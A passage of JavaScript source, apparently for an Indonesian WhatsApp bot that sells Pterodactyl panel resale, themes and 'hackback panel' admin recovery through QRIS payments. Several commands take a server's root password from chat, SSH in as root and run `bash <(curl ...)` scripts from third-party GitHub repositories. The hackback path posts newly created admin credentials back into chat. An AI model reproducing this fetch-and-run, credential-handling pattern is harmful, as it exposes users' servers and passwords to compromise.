 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Reseller Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan`;
    
    // Send payment QR and information to user
    let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Reseller Panel`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    
    // Update user status and store payment data
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await client.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000); // 5 minutes expiry
        }
    };

    // Start payment expiration timer
    await db.users[m.sender].saweria.exp();

    // Check payment status until the user has completed the payment or the time expires
    while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(15000); // Wait 15 seconds before checking payment status

        // Check payment status
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;

        // If payment matches the expected amount, process the order
        if (db.users[m.sender].saweria && req === db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            clearInterval(db.users[m.sender].saweria.exp);

            // Send payment confirmation to user
            await client.sendMessage(db.users[m.sender].saweria.chat, {text: `
            *PEMBAYARAN BERHASIL DITERIMA*

            *• ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}
            *• Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}
            *• Barang:* Reseller Panel Pterodactyl
            *• Payment:* ${resultcek.data.brand_name}
            `}, {quoted: db.users[m.sender].saweria.msg});

            // Send access details to the user (without creating admin panel)
            let orang = db.users[m.sender].saweria.chat;
            let teksclient = `*💸 Pembayaran Sukses! 🎉*

✨ Terima kasih atas pembelian Anda! Berikut ini adalah detail grup reseller yang Anda beli:

🌟 *Link Grup:* ${linkgcreseller}
📌 *Harga Reseller Panel:* ${Obj.harga}

🚀 *Selamat bergabung dan semoga sukses dalam bisnis Anda!*
Jika ada pertanyaan, jangan ragu untuk menghubungi kami. 💬

_“Kesuksesan adalah hasil dari kerja keras, semangat, dan peluang yang dimanfaatkan dengan baik!”_
`;

            await client.sendMessage(orang, {text: teksclient}, {quoted: null});
            await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break
             
case "jasahbpanel": case "jasahackbackpanel": {
    // Memecah input menjadi IP VPS dan password
    let t = text.split('|');
    if (t.length < 2) return reply(example("ipvps|pwvps"));
    let ipvps = t[0];
    let passwd = t[1];

    // Mengecek apakah ada transaksi yang belum selesai
    if (db.users[m.sender].status_deposit) {
        return client.sendMessage(m.chat, {
            text: "Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"
        });
    }

    // QRIS untuk pembayaran hackback panel
    let harga = 5000; // Harga layanan hackback panel
    let randomCharge = Math.floor(Math.random() * (250 - 110 + 1)) + 110;
    let amount = harga + randomCharge;

    // Membuat permintaan pembayaran
    const UrlQr = global.qrisOrderKuota;
    const paymentData = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

    // Mengirim QRIS kepada pengguna untuk pembayaran
    let teksPembayaran = `
*📄 INFORMASI PEMBAYARAN 📄*
  
*• Harga Layanan:* Rp. ${harga}
*• Total Pembayaran:* Rp. ${amount}
*• Layanan:* Hackback Panel
*• Expired:* 5 Menit

Silahkan scan QRIS di atas untuk melakukan pembayaran.`;
    let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: paymentData.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})

    // Menyimpan data transaksi
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: paymentData.data.result.transactionId,
        amount: paymentData.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
                    await client.sendMessage(db.users[m.sender].saweria.chat, {
                        text: "QRIS pembayaran telah expired!"
                    }, { quoted: db.users[m.sender].saweria.msg });
                    await client.sendMessage(db.users[m.sender].saweria.chat, {
                        delete: db.users[m.sender].saweria.msg.key
                    });
                    db.users[m.sender].status_deposit = false;
                    clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000); // Waktu kadaluwarsa 5 menit
        }
    };

    // Memulai timer kadaluwarsa pembayaran
    await db.users[m.sender].saweria.exp();

    // Mengecek status pembayaran secara berkala
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
        await sleep(15000);

        const paymentStatus = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        if (paymentStatus.data.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            clearInterval(db.users[m.sender].saweria.exp);

            // Melanjutkan eksekusi Hackback Panel
            const newuser = "admin" + getRandom("");
            const newpw = "admin" + getRandom("");
            const connSettings = {
                host: ipvps,
                port: '22',
                username: 'root',
                password: passwd
            };
            const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {
                        let teks = `
*Hackback panel sukses🔥*

*Berikut detail akun admin panel :*
*• Username:* ${newuser}
*• Password:* ${newpw}`;
                        await client.sendMessage(m.chat, { text: teks }, { quoted: loli });
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                    }).stderr.on('data', (data) => {
                        stream.write("skyzodev\n");
                        stream.write("7\n");
                        stream.write(`${newuser}\n`);
                        stream.write(`${newpw}\n`);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                reply('Katasandi atau IP tidak valid');
            }).connect(connSettings);
        }
    }
}
break;       
             
case "jasainstalltema": {
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
        await client.sendMessage(m.chat, {
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Thema Yang Tersedia',
          sections: [
            {
              title: 'List Thema',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Jasa install thema enigma',
                  id: '.jasainstalltemaenigma'
                },
                {
                  title: 'Jasa install thema nebula',
                  id: '.jasainstalltemanebula'
                },
                {
                  title: 'Jasa install depend',
                  id: '.jasainstalldepend'
                },
                {
                  title: 'Jasa install thema elysium',
                  id: '.jasainstalltemaelysium'
                },               
                {
                  title: 'Jasa install thema billing',
                  id: '.jasainstalltemabilling'
                },                
                {
                  title: 'Jasa install thema nightcore',
                  id: '.jasainstalltemanightcore'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Kalau mau install thema nebula, install depend terlebih dahulu"
})
      }
        break             
 

 


case "jasainstalltemaelysium": {
    if (m.isGroup) return reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Elysium Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await client.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(15000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`;
            const ress = new Client();

            ress.on('ready', async () => {
                reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selesai");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {
                        await reply("Berhasil install *tema Elysium* pterodactyl 🔥");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write('1\n');
                        stream.write('y\n');
                        stream.write('yes\n');
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                reply('Katasandi atau IP tidak valid');
            }).connect(connSettings);
            
            await client.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

//=====================================//

case "jasainstalltemaenigma": {
 if (m.isGroup) return reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 const UrlQr = global.qrisOrderKuota;

 function generateRandomNumber(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }

 let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
 const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Enigma Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

 let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit) {
 await client.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
 await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 delete db.users[m.sender].saweria;
 }
 }, 300000);
 }
 };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
 const req = await resultcek.data.amount;
 if (req == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 const connSettings = {
 host: global.installtema.vps,
 port: '22',
 username: 'root',
 password: global.installtema.pwvps,
 };

 const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
 const ress = new Client();

 ress.on('ready', () => {
 reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
 ress.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', async (code, signal) => { 
 await reply("Berhasil install *tema enigma* pterodactyl ✅");
 ress.end();
 }).on('data', async (data) => {
 console.log(data.toString());
 stream.write(`skyzodev\n`); // Key Token : skyzodev
 stream.write('1\n');
 stream.write('3\n');
 stream.write('https://wa.me/6285624297893\n');
 stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
 stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
 stream.write('yes\n');
 stream.write('x\n');
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 reply('Kata sandi atau IP VPS tidak valid.');
 }).connect(connSettings);

 await client.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
 delete db.users[m.sender].saweria;
 }
 }
}
break;

case "jasainstalltemabilling": {
    if (m.isGroup) return reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Billing Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await client.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(15000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                reply("Memproses instalasi *tema billing* Pterodactyl. Tunggu 1-10 menit hingga proses selesai...");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async () => {    
                        await reply("Berhasil menginstal *tema billing* Pterodactyl 🔥");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write(`skyzodev\n`); // Key Token: skyzodev
                        stream.write(`1\n`);
                        stream.write(`2\n`);
                        stream.write(`yes\n`);
                        stream.write(`x\n`);
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);
            
            await client.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasainstalltemanightcore": {
    if (m.isGroup) return reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Nightcore Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await client.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(15000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', async () => {
                reply("Memproses instalasi *tema Nightcore* Pterodactyl. Tunggu 1-10 menit hingga selesai...");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async () => {
                        await reply("Berhasil menginstal *tema Nightcore* Pterodactyl 🔥");
                        ress.end();
                    }).on('data', (data) => {
                        console.log(data.toString());
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);
            
            await client.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "deposit": {
    if (!q) return reply(`*Example : ${prefix+command} 50000*`);

    let amount = parseInt(q.replace(/[^0-9]/g, "")); // Hanya angka untuk jumlah deposit
    if (isNaN(amount) || amount < 1000) {
        return reply(`*Jumlah minimal deposit adalah Rp1000.*\n\n_Example: ${prefix+command} 50000_`);
    }

    const UrlQr = global.qrisOrderKuota;

    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

    const teksPembayaran = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Deposit
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`;

    let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Deposit`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await client.sendMessage(db.users[m.sender].deposit.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await client.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].deposit.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Tambahkan saldo ke akun pengguna
            if (!db.users[m.sender].saldo) db.users[m.sender].saldo = 0;
            db.users[m.sender].saldo += parseInt(req);

            await client.sendMessage(db.users[m.sender].deposit.chat, { text: "Pembayaran berhasil! Saldo telah ditambahkan ke akun Anda." }, { quoted: db.users[m.sender].deposit.msg });
            await reply(`Saldo sebesar Rp${await toIDR(req)} telah ditambahkan ke akun Anda ✅`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "buypanel": {
if (m.isGroup) return reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp11.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${global.botname2}\nAuto Order Panel`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

